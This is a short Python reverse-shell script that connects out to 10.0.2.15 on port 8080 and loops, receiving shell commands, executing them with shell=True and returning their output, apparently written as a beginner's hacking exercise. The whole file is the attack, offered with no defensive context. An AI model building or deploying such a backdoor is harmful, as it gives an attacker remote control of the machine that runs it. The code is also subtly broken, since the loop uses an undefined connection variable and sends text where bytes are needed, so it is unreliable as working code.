import socket
import subprocess
import sys

try:
	def command_execution(command):
		return subprocess.check_output(command, shell=True)


	socket_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	socket_connection.connect(("10.0.2.15", 8080))
	socket_connection.send("connections completed \n")

	while True:
		command = create_a_connection.recv(1024)
		command_output = command_execution(command)
		create_a_connection.send(command_output)

	#create_a_connection.close()

except KeyboardInterrupt:
	print("pressed 'CTRL + C'\n")
	sys.exit()

except Exception:
	print(Exception)
	sys.exit()
